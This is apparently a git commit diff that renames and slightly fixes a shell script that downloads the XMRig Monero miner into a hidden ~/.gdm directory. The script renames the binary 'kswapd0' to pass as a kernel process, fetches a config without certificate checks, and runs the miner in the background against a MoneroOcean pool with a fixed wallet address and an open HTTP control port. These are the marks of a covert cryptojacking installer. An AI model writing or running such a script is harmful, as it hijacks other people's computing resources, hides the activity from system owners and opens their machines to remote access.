b1af10ca292e561ed6b5edb4554f35e69d1a6992
Acen <113854209+littlAcen@users.noreply.github.com>
2024-07-19 17:21:37 +0200

    Update and rename gdm-static.sh to setup_gdm-static.sh

--- gdm-static.sh
+++
@@ -1,8 +0,0 @@
-mkdir $HOME/.gdm/
-cd $HOME/.gdm/
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz -O $HOME/.gdm/
-tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz 
-mv xmrig-6.21.3/xmrig $HOME/.gdm/kswapd0
-chmod +x kswapd0
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm/config.json
-$HOME/.gdm/kswapd0 --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash&
---
+++ setup_gdm-static.sh
@@ -0,0 +1,8 @@
+mkdir $HOME/.gdm/
+cd $HOME/.gdm/
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz -O $HOME/.gdm/xmrig-6.21.3-linux-static-x64.tar.gz
+tar xzvf xmrig-6.21.3-linux-static-x64.tar.gz -C $HOME/.gdm/
+mv $HOME/.gdm/xmrig-6.21.3/xmrig $HOME/.gdm/kswapd0
+chmod +x $HOME/.gdm/kswapd0
+wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm/config.json
+$HOME/.gdm/kswapd0 --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash &
